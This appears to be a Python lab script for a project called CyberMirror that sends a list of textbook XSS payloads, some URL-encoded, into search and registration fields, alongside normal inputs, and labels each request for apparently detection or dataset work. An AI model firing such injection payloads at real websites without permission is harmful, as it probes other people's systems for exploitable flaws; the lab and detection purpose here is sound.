"""Send harmless textbook XSS payloads (lab only) to CyberMirror."""
from __future__ import annotations

import argparse
import random
import sys
import time
from collections import Counter
from typing import Optional
from urllib.parse import quote

import requests

try:
    from attacker.normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url
except ImportError:
    from normal_traffic import DEFAULT_BASE_URL, assert_safe_base_url

ATTACK_LABEL = "xss"
NORMAL_LABEL = "normal"

# Harmless textbook XSS payloads only (alert(1) style — no real exploit kit)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    '"><script>alert(1)</script>',
    "<iframe src=javascript:alert(1)>",
    "<math><mtext></math><script>alert(1)</script>",
    # Encoded variants
    "%3Cscript%3Ealert(1)%3C/script%3E",
    quote("<script>alert(1)</script>"),
    quote("<img src=x onerror=alert(1)>"),
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
]

NORMAL_INPUTS = [
    "alice.demo",
    "alice.demo@example.com",
    "laptop",
    "john smith",
    "quarterly report",
    "office chair",
]


def _delay() -> None:
    time.sleep(random.uniform(0.03, 0.18))


def _send(
    session: requests.Session,
    method: str,
    url: str,
    *,
    label: str,
    counts: Counter,
    **kwargs,
) -> requests.Response:
    headers = dict(kwargs.pop("headers", {}) or {})
    headers["X-Test-Label"] = label
    kwargs.setdefault("timeout", 20)
    kwargs.setdefault("allow_redirects", False)
    response = session.request(method, url, headers=headers, **kwargs)
    counts[response.status_code] += 1
    _delay()
    return response


def run(base_url: str) -> tuple[Counter, Counter]:
    assert_safe_base_url(base_url)
    base = base_url.rstrip("/")
    attack_counts: Counter = Counter()
    normal_counts: Counter = Counter()
    session = requests.Session()
    session.headers["User-Agent"] = "CyberMirror-XSSAttack/1.0 (+lab)"

    print(f"Target: {base}")
    print(f"XSS payloads: {len(XSS_PAYLOADS)}")
    print(f"Normal inputs: {len(NORMAL_INPUTS)}")
    print()

    for payload in XSS_PAYLOADS:
        print(f"[xss] search q={payload!r}")
        _send(
            session,
            "GET",
            f"{base}/search",
            label=ATTACK_LABEL,
            counts=attack_counts,
            params={"q": payload},
        )

        # Register fields (username / email) — password avoided on purpose
        uname = f"xss_{abs(hash(payload)) % 10_000}"
        print(f"[xss] register username/email payload")
        _send(
            session,
            "POST",
            f"{base}/register",
            label=ATTACK_LABEL,
            counts=attack_counts,
            data={
                "username": payload[:80],
                "email": f"{uname}@example.com",
                "password": "XssLabPass123!",
            },
        )
        _send(
            session,
            "POST",
            f"{base}/register",
            label=ATTACK_LABEL,
            counts=attack_counts,
            data={
                "username": uname,
                "email": payload[:120],
                "password": "XssLabPass123!",
            },
        )

    for term in NORMAL_INPUTS:
        print(f"[normal] search/register {term!r}")
        _send(
            session,
            "GET",
            f"{base}/search",
            label=NORMAL_LABEL,
            counts=normal_counts,
            params={"q": term},
        )
        _send(
            session,
            "POST",
            f"{base}/register",
            label=NORMAL_LABEL,
            counts=normal_counts,
            data={
                "username": term.replace(" ", ".")[:40] or "normal.user",
                "email": f"{term.replace(' ', '.')}@example.com"[:80],
                "password": "NormalPass123!",
            },
        )

    return attack_counts, normal_counts


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Lab-only XSS traffic generator.")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    args = parser.parse_args(argv)
    try:
        attack_counts, normal_counts = run(args.base_url)
    except requests.RequestException as exc:
        print(f"Request failed: {exc}", file=sys.stderr)
        return 1

    print()
    print("=== Summary (X-Test-Label: xss) ===")
    print(f"Requests sent: {sum(attack_counts.values())}")
    for code in sorted(attack_counts):
        print(f"  {code}: {attack_counts[code]}")
    print()
    print("=== Summary (X-Test-Label: normal) ===")
    print(f"Requests sent: {sum(normal_counts.values())}")
    for code in sorted(normal_counts):
        print(f"  {code}: {normal_counts[code]}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
